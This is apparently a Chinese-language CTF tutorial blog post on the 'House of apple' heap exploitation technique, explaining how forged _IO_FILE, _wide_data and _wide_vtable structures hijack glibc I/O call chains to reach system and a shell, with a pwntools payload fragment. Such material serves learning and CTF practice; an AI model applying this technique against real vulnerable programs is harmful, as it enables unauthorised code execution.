~~总算是吃明白大🍎了~~

## 简介

House of apple 是一种 Glibc >= 2.35 的高版本堆题的通杀手段，主要是通过利用 _IO_FILE 和/或 FSOP 配合拿到 shell。

简单介绍一下：

> FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。
>
> 在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上的。

我们可以看到 `_IO_2_1_stderr_` 是一个 `FILE` 结构体，但实际上它外面包着一个更大的结构。

`_IO_FILE_plus` 结构体：

```c
struct _IO_FILE_plus {
	FILE file; // FILE 是 typedef struct _IO_FILE FILE;
	const struct _IO_jump_t *vtable; // 主要攻击面
}
```

进一步可以看到 `_IO_FILE`：

```c
struct _IO_FILE {
	int _flags;
	char *_IO_read_ptr;
	char *_IO_read_end;
	char *_IO_read_base;
	char *_IO_write_base;
	char *_IO_write_ptr;
	char *_IO_write_end;
	char *_IO_buf_base;
	char *_IO_buf_end;
	char *_IO_save_base;
	char *_IO_backup_base;
	char *_IO_save_end;
	struct _IO_marker *_markers;
	struct _IO_FILE *_chain;
	int _fileno;
	int _flags2 : 24;
	char _short_backupbuf[1];
	__off_t _old_offset;
	unsigned short _cur_column;
	signed char _vtable_offset;
	char _shortbuf[1];
	_IO_lock_t *_lock;
	__off64_t _offset;
	struct _IO_codecvt *_codecvt; // 未来的主要攻击面
	struct _IO_wide_data *_wide_data; // 未来的主要攻击面
	struct _IO_FILE *_freeres_list;
	void *_freeres_buf;
	struct _IO_FILE **_prevchain;
	int _mode;
	char _unused2[20];
}
```

关注一下 `_IO_FILE_plus->vtable`，正常情况下它是 `_IO_file_jumps` 类型，这种 `_IO_xxxx_jumps` 结构一般都是下面这样：


```c
const struct _IO_jump_t {
	size_t __dummy;
	size_t __dummy2;
	_IO_finish_t __finish;
	_IO_overflow_t __overflow;
	_IO_underflow_t __underflow;
	_IO_underflow_t __uflow;
	_IO_pbackfail_t __pbackfail;
	_IO_xsputn_t __xsputn;
	_IO_xsgetn_t __xsgetn;
	_IO_seekoff_t __seekoff;
	_IO_seekpos_t __seekpos;
	_IO_setbuf_t __setbuf;
	_IO_sync_t __sync;
	_IO_doallocate_t __doallocate;
	_IO_read_t __read;
	_IO_write_t __write;
	_IO_seek_t __seek;
	_IO_close_t __close;
	_IO_stat_t __stat;
	_IO_showmanyc_t __showmanyc;
	_IO_imbue_t __imbue;
}
```

比较常见的有 `_IO_file_jumps`、`_IO_wfile_jumps`、`_IO_strn_jumps`、`_IO_wstrn_jumps`、`_IO_str_jumps` 等等，这些虚标里存了大量的函数指针。


再关注一下 `_wide_data` 这个成员，它一般是 `struct _IO_wide_data`，结构是下面这样：

```c
struct _IO_wide_data {
	wchar_t *_IO_read_ptr;
	wchar_t *_IO_read_end;
	wchar_t *_IO_read_base;
	wchar_t *_IO_write_base;
	wchar_t *_IO_write_ptr;
	wchar_t *_IO_write_end;
	wchar_t *_IO_buf_base;
	wchar_t *_IO_buf_end;
	wchar_t *_IO_save_base;
	wchar_t *_IO_backup_base;
	wchar_t *_IO_save_end;
	__mbstate_t _IO_state;
	__mbstate_t _IO_last_state;
	struct _IO_codecvt _codecvt;
	wchar_t _shortbuf[1];
	const struct _IO_jump_t *_wide_vtable;
}
```

这个 `_wide_vtable` 就是 `_IO_wfile_jumps` 类型。

这些 FILE 结构是通过链表相连的，也就是 `struct _IO_FILE *_chain;` 这个成员，链表头存在 `_IO_list_all` 里。


## House of apple


### glibc 2.23

从 glibc 2.23 开始讲起。

以比较常见的 `exit()` 讲起，程序在执行到 `exit()` 时会走 `exit -> fcloseall -> _IO_cleanup -> _IO_flush_all_lockp -> _IO_OVERFLOW` 

```c
int
_IO_flush_all_lockp (int do_lock)
{
  ...
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
  {
       ...
       if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))
               && _IO_OVERFLOW (fp, EOF) == EOF)
           {
               result = EOF;
          }
        ...
  }
}
```

也就是说，程序在执行到 `_IO_flush_all_lockp` 时，会去遍历 `_IO_list_all` 的链表里的每一个 FILE，如果满足条件的话，会调用每个结构体中 `vtable->_overflow` 函数指针指向的函数。

也就是说，如果我们能劫持 `vtable->_overflow` 函数指针，那就可以任意函数执行，但是遗憾的是，glibc2.23 中，vtable 所在的段是不可写的，所以没办法直接修改 `_overflow` 指针。但是可以伪造一个 `fake_vtable`，再在 `fake_vtable` 里把 `_IO_overflow` 设置成 `system` or `one_gadget`，然后把原本的 `*vtable` 指针修改到 `fake_vtable` 上。

总结，需要通过的 `check` 有：

1. `fp->_mode` <= 0（一般设置成 0，也即不用写）
2. `fp->_IO_write_ptr > fp->_IO_write_base`，一般直接把前者设置成 1 后者保持为 0

这些成员/函数指针的偏移可以在 gdb 自己调试得到。


### glibc 2.24

2.24中新增了对vtable指针的检测，检查该地址是否合法：

其首先检查 vtable 是否在 libc 的数据段上，如果不在，则检查其是否在 ld 等其他模块的合法位置，若否则报错。然而这个检查跳过了 _IO_str_jumps、IO_wstr_jumps、_IO_wfile_jumps 等等与原本 vtable 结构相同的虚表，则我们可以通过劫持这些个虚表，再修改 vtable 指针即能绕过检查。

核心思路就是，通过将 vtable 设置成这些虚表（加减偏移）（这一步可以使用 largebin attack），使其能调用某些 io 函数，这些 io 函数的特点是会去调用 `_wide_data -> _wide_vtable` 里的函数指针。而 `_wide_data -> _wide_vtable` 是可以伪造的（使用 largebin attack），从而达到我们任意函数执行的目的。

这里，通过区分不同的 io 函数，一般会总结很多链子出来，先讲比较常见的。

#### _IO_wfile_overflow

```c
#define _IO_NO_WRITES 8 /* Writing not allowd */
#define _IO_CURRENTLY_PUTTING 0x800
#define _IO_UNBUFFERED 2

wint_t
_IO_wfile_overflow (_IO_FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
	{
	  _IO_wdoallocbuf (f); // 攻击点
	  ...
	}
      else
	{
	  ...
	}
  }
}

void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)// _IO_WXXXX 调用
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
		     fp->_wide_data->_shortbuf + 1, 0);
}
libc_hidden_def (_IO_wdoallocbuf)
```

调用链：`_IO_wfile_overflow` -> `_IO_wdoallocbuf` -> `_IO_WDOALLOCATE` -> `*(fp->_wide_data->_wide_vtable + 0x68)(fp)`

构造：

- `_flags` 设置为 `~(2 | 0x8 | 0x800)`，如果不需要控制 `rdi`，设置为 `0` 即可；如果需要获得 shell，可设置为 `  sh;`，注意前面有两个空格
- vtable 设置为 `_IO_wfile_jumps` / `_IO_wfile_jumps_mmap` / `_IO_wfile_jumps_maybe_mmap` 地址（加减偏移），使其能成功调用 `_IO_wfile_overflow` 即可
- `_wide_data`（偏移为 0xa0）设置为可控堆地址 A
- `_wide_data->_IO_write_base`（偏移为 0x18）设置为 0
- `_wide_data->_IO_buf_base`（偏移为 0x30）设置为 0
- `_wide_data->_wide_vtable`（偏移为 0xe0）设置为可控堆地址 B
- `_wide_data->_wide_vtable->doallocate`（偏移为 0x68）设置为 ogg or `system` 拿 shell


一个 exp 构造如下：

```python
fakeio = flat({
    0: b"\x20\x80||sh",
    0x20: 0,
    0x28: 1,
    # 0x88: libc.sym['_IO_stdfile_2_lock'],  # glibc 2.38 以上会 check _lock 字段
    0xa0: heap_addr + 0x43010,  # _wide_data
    0xd8: libc.sym['_IO_wfile_jumps']
}, filler=b"\x00")

fakewide = flat({
    0x18: 0,
    0x30: 0,
    0xe0: heap_addr + 0x65010,
}, filler=b"\x00")

fake_wide_vtable = flat({
    0x68: libc.sym['system']
}, filler=b"\x00")
```

也就是要伪造一个 `_IO_FILE` 结构体，一个 `_wide_data` 结构体，一个 `_wide_vtable` 结构体



#### _IO_wfile_underflow_mmap

```c
#define _IO_NO_READS 4 /* Reading not allowed */

static wint_t
_IO_wfile_underflow_mmap (FILE *fp)
{
  struct _IO_codecvt *cd;
  const char *read_stop;

  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
    return *fp->_wide_data->_IO_read_ptr;

  cd = fp->_codecvt;

  /* Maybe there is something left in the external buffer.  */
  if (fp->_IO_read_ptr >= fp->_IO_read_end
      /* No.  But maybe the read buffer is not fully set up.  */
      && _IO_file_underflow_mmap (fp) == EOF)
    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error
       flags as appropriate.  */
    return WEOF;

  /* There is more in the external.  Convert it.  */
  read_stop = (const char *) fp->_IO_read_ptr;

  if (fp->_wide_data->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_wide_data->_IO_save_base != NULL)
	{
	  free (fp->_wide_data->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_wdoallocbuf (fp);// 攻击点
    }
    //......
}


void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)// _IO_WXXXX 调用
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
		     fp->_wide_data->_shortbuf + 1, 0);
}
libc_hidden_def (_IO_wdoallocbuf)
```


调用链：`_IO_wfile_underflow_mmap` -> `_IO_wdoallocbuf` -> `_IO_WDOALLOCATE` -> `*(fp->_wide_data->_wide_vtable + 0x68)(fp)`

需要满足：
- `fp->_flags & _IO_NO_READS == 0`
- `fp->_wide_data->_IO_read_ptr >= fp->_wide_data->_IO_read_end`
- `fp->_IO_read_ptr < fp->_IO_read_end`
- `fp->_wide_data->_IO_buf_base == NULL`
- `fp->_wide_data->_IO_save_base != NULL`

构造参考需要满足的条件即可。

#### _IO_wdefault_xsgetn

```c
#define _IO_CURRENTLY_PUTTING 0x800

size_t
_IO_wdefault_xsgetn (FILE *fp, void *data, size_t n)
{
  size_t more = n;
  wchar_t *s = (wchar_t*) data;
  for (;;)
    {
      /* Data available. */
      ssize_t count = (fp->_wide_data->_IO_read_end
                       - fp->_wide_data->_IO_read_ptr);
      if (count > 0)
	{
	  if ((size_t) count > more)
	    count = more;
	  if (count > 20)
	    {
	      s = __wmempcpy (s, fp->_wide_data->_IO_read_ptr, count);
	      fp->_wide_data->_IO_read_ptr += count;
	    }
	  else if (count <= 0)
	    count = 0;
	  else
	    {
	      wchar_t *p = fp->_wide_data->_IO_read_ptr;
	      int i = (int) count;
	      while (--i >= 0)
		*s++ = *p++;
	      fp->_wide_data->_IO_read_ptr = p;
            }
            more -= count;
        }
      if (more == 0 || __wunderflow (fp) == WEOF)
	break;
    }
  return n - more;
}
libc_hidden_def (_IO_wdefault_xsgetn)

wint_t
__wunderflow (FILE *fp)
{
  if (fp->_mode < 0 || (fp->_mode == 0 && _IO_fwide (fp, 1) != 1))
    return WEOF;

  if (fp->_mode == 0)
    _IO_fwide (fp, 1);
  if (_IO_in_put_mode (fp))
    if (_IO_switch_to_wget_mode (fp) == EOF) // 调用到这里
      return WEOF;
    // ......
}

int
_IO_switch_to_wget_mode (FILE *fp)
{
  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF) // 需要走到这里
      return EOF;
    // .....
}
```

调用链：`_IO_wdefault_xsgetn` -> `__wunderflow` -> `_IO_switch_to_wget_mode` -> `_IO_WOVERFLOW` -> `*(fp->_wide_data->_wide_vtable + 0x18)(fp)`

需要满足：
- `n != 0`
- `fp->_wide_data->_IO_read_ptr == fp->_wide_data->_IO_read_end`，使得 `count` 为 0
- `fp->mode > 0`
- `fp->_flags & _IO_CURRENTLY_PUTTING != 0`
- `fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base`


**总结：不管调用什么函数触发 `_IO_FILE`（`exit()` or `fflush()`...），只需要想办法使其能调用这些 io 函数就可以。**
